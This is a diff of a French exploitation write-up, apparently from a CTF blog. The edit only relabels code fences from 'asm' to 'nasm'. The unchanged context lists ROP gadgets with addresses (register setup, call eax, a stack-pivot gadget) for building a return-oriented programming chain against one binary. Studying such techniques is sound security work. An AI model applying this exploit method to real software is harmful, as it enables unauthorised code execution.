@@ -1086,7 +1086,7 @@ L'objectif est de mettre en place une chaîne de ROPs qui peut fonctionner sans 
 
 A l'aide de [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) on peut trouver des suites d'instructions pour réaliser certaines étapes.  
 
-```asm
+```nasm
 0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret
 ```
 
@@ -1094,19 +1094,19 @@ Avec un contrôle de ebx on peut ici récupérer la valeur à une adresse donné
 
 Mais avant cela il faut s'assurer que eax a une valeur fixe. Le gadget suivant est un peu bizarre mais il met eax à 3 :  
 
-```asm
+```nasm
 0x08048760 : mov eax, 0x804b077 ; sub eax, 0x804b074 ; cmp eax, 6 ; ja 0x804877f ; ret
 ```
 
 On aura besoin de définir ebx à de multiples reprises :  
 
-```asm
+```nasm
 0x0804859d : pop ebx ; ret
 ```
 
 Et pour le final :  
 
-```asm
+```nasm
 0x08048786 : call eax
 ```
 
@@ -1116,7 +1116,7 @@ Il ne reste qu'à trouver un gadget de *stack pivot*, celui qui va faire pointer
 
 Après recherche et essai ce dernier est impeccable :  
 
-```asm
+```nasm
 0x08048dd9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 ```
 
